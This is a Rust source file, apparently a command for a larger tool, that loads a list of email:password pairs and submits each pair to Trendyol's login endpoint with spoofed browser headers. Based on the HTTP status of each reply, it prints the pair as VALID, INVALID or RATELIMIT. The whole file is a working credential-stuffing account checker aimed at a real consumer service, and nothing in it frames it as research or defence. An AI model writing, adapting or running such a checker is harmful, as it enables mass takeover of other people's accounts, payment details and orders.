//use crate::cmd_manager;
use std::fs;
use reqwest;
use std::collections::HashMap;
use reqwest::{blocking::Client, blocking::RequestBuilder};


fn check(accounts: Vec<(String, String)>, client: Client) -> bool {
    let trendyolurl = "https://auth.trendyol.com/login";
    for account in accounts {
        let email: String = account.0;
        let password: String = account.1;
        let mut postdata = HashMap::new();
        postdata.insert("email", &email);
        postdata.insert("password", &password);
        let request: RequestBuilder = client.post(trendyolurl);
        let result = request
            .header("accept", "*/*")
            .header("accept-encoding", "gzip, deflate, br")
            .header("accept-language", "tr-TR,tr;q=0.9")
            .header("application-id", "1")
            .header("content-type", "application/json;charset=UTF-8")
            .header("culture", "tr-TR")
            .header("origin", "https://auth.trendyol.com")
            .header("referer", "https://auth.trendyol.com/static/fragment?application-id=1&storefront-id=1&culture=tr-TR&language=tr&debug=false")
            .header("sec-fetch-dest", "empty")
            .header("sec-fetch-mode", "cors")
            .header("sec-fetch-site", "same-origin")
            .header("sec-gpc", "1")
            .header("storefront-id", "1")
            .header("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36")
            .json(&postdata)
            .send();
        let result = match result {
            Ok(res) => res,
            Err(_err) => {
                println!("Request failed!");
                return true
            }
        };

        match result.status().as_u16() {
            429 => println!("RATELIMIT {}:{}",email,password),
            400 => println!("INVALID {}:{}", email,password),
            200 => println!("VALID {}:{}", email, password),
            _ => println!("UNKNOWN STATUS CODE: {} {}:{}", result.status(), email.as_str(), password.as_str())
        }

        //println!("Status code: {}\nBody: {:?}",
        //    result.status(), result.text());

    }
    return false;
}

pub fn command(_args: Vec<&str>) -> bool {
    if _args.len() > 1 {
        let client: Client = Client::new();
        let filename = _args[1];
        let file = fs::read_to_string(filename);
        let file = match file {
            Ok(_file) => _file,
            Err(_err) => {
                println!("The file {name} does not exist.",
                    name=filename);
                return true;
            }
        };
        let mut accounts: Vec<(String, String)> = Vec::new();
        let lines: Vec<&str> = file.split("\n").collect();
        for line in lines {
            let splitted: Vec<&str> = line.split(":").collect();
            if splitted.len() < 2 {
                continue;
            }
            let email: String = String::from(splitted[0]);
            let password: String = String::from(splitted[1]);
            accounts.push((email, password));
        } 
        check(accounts, client);

        return false;
    } else {
        println!("No file was provided. please provide a file");
        return true;
    }
}